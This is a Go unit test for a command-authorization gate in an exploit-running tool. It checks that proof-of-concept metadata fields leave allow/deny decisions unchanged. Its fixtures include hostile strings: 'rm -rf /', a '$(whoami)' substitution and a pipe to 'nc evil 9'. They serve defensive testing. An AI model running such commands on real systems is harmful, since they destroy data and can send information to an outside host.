package secgate

import (
	"context"
	"testing"
)

// TestPoCMetadataDoesNotAffectDecision proves the interpreter-PoC display
// fields on Command (PoCIsInterpreter/PoCHash/PoCBody) are pure metadata: setting
// them must not change any allow/deny decision, because no gate layer reads them.
// Both an allowed command and a denied (destructive) command are checked with the
// fields set versus unset, including a PoCBody that contains shell metacharacters
// and newlines - which would trip metaDecision if any decision path inspected it.
func TestPoCMetadataDoesNotAffectDecision(t *testing.T) {
	withPoC := func(c Command) Command {
		c.PoCIsInterpreter = true
		c.PoCHash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
		c.PoCBody = "import os; os.system('id > /tmp/x && rm -rf /')\n$(whoami)|nc evil 9\n"
		return c
	}
	cases := []struct {
		name string
		cmd  Command
	}{
		{"allowed armed exploit", armedExploit("searchsploit", "openssh")},
		{"denied destructive armed exploit", armedExploit("rm", "-rf", "/")},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			g1 := localExploitGate(t, &okConfirmer{})
			d1 := g1.Authorize(context.Background(), tc.cmd)
			g2 := localExploitGate(t, &okConfirmer{})
			d2 := g2.Authorize(context.Background(), withPoC(tc.cmd))
			if d1.Allowed != d2.Allowed || d1.Reason != d2.Reason {
				t.Fatalf("PoC metadata changed the gate decision:\n without PoC: allowed=%v reason=%q\n with PoC:    allowed=%v reason=%q",
					d1.Allowed, d1.Reason, d2.Allowed, d2.Reason)
			}
		})
	}
}
